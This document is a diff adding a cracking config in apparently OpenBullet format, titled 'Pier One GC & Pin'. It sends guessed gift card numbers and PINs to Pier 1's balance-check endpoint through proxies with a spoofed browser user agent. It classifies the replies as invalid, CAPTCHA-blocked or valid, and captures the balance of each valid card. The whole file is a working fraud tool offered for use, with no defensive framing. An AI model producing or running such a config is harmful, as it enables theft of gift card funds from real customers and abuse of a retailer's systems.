@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Pier One GC & Pin",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-07T14:01:36.8173017+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "CardPin",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 208580393
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 1837239156
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.pier1.com/on/demandware.store/Sites-pier1_us-Site/default/GiftCard-CheckBalance" AutoRedirect=TRUE 
+  CONTENT "giftcardnumber=<USER>&giftcardpin=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "INACTIVE_CARD" 
+    KEY "INVALID_CARD_NUMBER" 
+    KEY "INVALID_PIN" 
+    KEY "\"service_code\":\"20\"" 
+  KEYCHAIN Ban OR 
+    KEY "Please verify you are a human" 
+  KEYCHAIN Success OR 
+    KEY "service_code\":\"01" 
+PARSE "<SOURCE>" JSON "value" Recursive=FALSE -> CAP "Balance" "" "" 
